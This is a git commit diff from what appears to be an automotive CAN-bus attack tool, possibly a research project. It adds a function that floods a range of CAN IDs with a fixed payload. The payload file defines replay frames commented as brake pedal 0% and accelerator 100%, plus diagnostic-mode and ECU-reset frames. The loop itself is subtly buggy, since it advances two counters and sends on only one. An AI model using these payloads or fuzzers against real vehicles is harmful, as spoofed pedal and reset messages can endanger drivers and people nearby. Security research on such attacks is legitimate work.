91cd9f0aafa920076a6f641ba448830f882dbc34
ChoChiMoo <eddyojh@gmail.com>
2024-11-07 02:21:11 +0900

    [feat]: add fuzzing.c/fuzzing_random_canid() complete

--- tool/attack-functions/fuzzing.c
+++ tool/attack-functions/fuzzing.c
@@ -1,11 +1,19 @@
 #include "all_headers.h"
 
+#define END_CANID 0x555
+
 void fuzzing_find_uds(int socket, struct sockaddr_can *addr, int canid, int time_diff){
 
 }
 
 void fuzzing_random_canid(int socket, struct sockaddr_can *addr, int canid, int time_diff){
+    for (int tx_can_id = canid; tx_can_id <= END_CANID; tx_can_id++) {
+        send_can_packet(socket, addr, fuzzing.payload3, fuzzing.payload3_len, canid);
+        canid ++;
 
+        if (time_diff == 0) break;
+        usleep(time_diff*1000);
+    }
 }
 
 void fuzzing_random_payload(int socket, struct sockaddr_can *addr, int canid, int time_diff){
--- tool/payloads.c
+++ tool/payloads.c
@@ -11,22 +11,24 @@ struct payloads dos = {
 };
 
 struct payloads replay ={
-    .payload1 = {0x00, 0x00, 0xDF, 0x9D, 0x35, 0xEE, 0x12, 0x12},    //tx payload break pedal 0%
-    .payload2 = {0x0F, 0xC5, 0xD3, 0x99, 0xDD, 0x21, 0x12, 0x12},    //tx payload acceel pedal 100%
+    .payload1 = {0x00, 0x00, 0xDF, 0x9D, 0x35, 0xEE, 0x12, 0x12},   //tx payload break pedal 0%
+    .payload2 = {0x0F, 0xC5, 0xD3, 0x99, 0xDD, 0x21, 0x12, 0x12},   //tx payload acceel pedal 100%
     .payload1_len = 8,
     .payload2_len = 8
 };
 
 struct payloads fuzzing = {
-    .payload1 = {0x02, 0x4e, 0x00},      //tx payload to make reply
-    .payload2 = {0x02, 0x7e, 0x00},      //rx payload to check ecu live
+    .payload1 = {0x02, 0x4e, 0x00},                                 //tx payload to make reply
+    .payload2 = {0x02, 0x7e, 0x00},                                 //rx payload to check ecu live
+    .payload3 = {0x00, 0x00, 0xD2, 0x11, 0x73, 0x58, 0xFA, 0xF8},   //fuzzing_random_canid payload
     .payload1_len = 3,
-    .payload2_len = 3
+    .payload2_len = 3,
+    .payload3_len = 8
 };
 
 struct payloads suspension ={
-    .payload1 = {0x02, 0x10, 0x02},      //tx payload to enter diag mode
-    .payload2 = {0x02, 0x11, 0x01},      //tx payload to make ecu reset
+    .payload1 = {0x02, 0x10, 0x02},                                 //tx payload to enter diag mode
+    .payload2 = {0x02, 0x11, 0x01},                                 //tx payload to make ecu reset
     .payload1_len = 3,
     .payload2_len = 3
 };
